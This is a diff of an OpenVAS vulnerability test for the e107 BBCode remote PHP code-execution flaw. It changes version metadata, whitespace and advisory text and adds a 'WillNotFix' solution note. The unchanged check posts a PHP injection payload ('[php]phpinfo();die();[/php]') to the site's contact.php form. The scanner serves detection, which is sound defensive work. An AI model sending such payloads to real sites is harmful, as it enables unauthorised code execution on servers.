@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_e107_40252.nasl 5306 2017-02-16 09:00:16Z teissa $
+# $Id: gb_e107_40252.nasl 13960 2019-03-01 13:18:27Z cfischer $
 #
 # e107 BBCode Arbitrary PHP Code Execution Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:e107:e107";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100649");
-  script_version("$Revision: 5306 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
+  script_version("$Revision: 13960 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
   script_tag(name:"creation_date", value:"2010-05-25 13:42:13 +0200 (Tue, 25 May 2010)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -49,13 +49,19 @@ if(description)
   script_xref(name:"URL", value:"http://www.php-security.org/2010/05/19/mops-2010-035-e107-bbcode-remote-php-code-execution-vulnerability/index.html");
 
   script_tag(name:"summary", value:"e107 is prone to a remote PHP code-execution vulnerability.");
+
   script_tag(name:"affected", value:"e107 version 0.7.20 and prior are affected.");
+
   script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary
-  malicious PHP code in the context of the webserver process. This may
-  facilitate a compromise of the application and the underlying system;
-  other attacks are also possible.");
+  malicious PHP code in the context of the webserver process. This may facilitate a compromise of the
+  application and the underlying system. Other attacks are also possible.");
 
   script_tag(name:"qod_type", value:"remote_app");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
   exit(0);
 }
@@ -66,7 +72,7 @@ include("host_details.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
- 
+
 if( dir == "/" ) dir = "";
 
 variables = string( "send-contactus=1&author_name=[php]phpinfo()%3bdie()%3b[/php]" );
@@ -74,12 +80,12 @@ url = dir + "/contact.php";
 
 host = http_host_name( port:port );
 
-req = string( "POST ", url, " HTTP/1.1\r\n", 
+req = string( "POST ", url, " HTTP/1.1\r\n",
               "Referer: http://", host, url, "\r\n",
-              "Host: ", host, "\r\n", 
-              "Content-Type: application/x-www-form-urlencoded\r\n", 
-              "Content-Length: ", strlen(variables), 
-              "\r\n\r\n", 
+              "Host: ", host, "\r\n",
+              "Content-Type: application/x-www-form-urlencoded\r\n",
+              "Content-Length: ", strlen(variables),
+              "\r\n\r\n",
               variables );
 res = http_keepalive_send_recv( port:port, data:req );
 
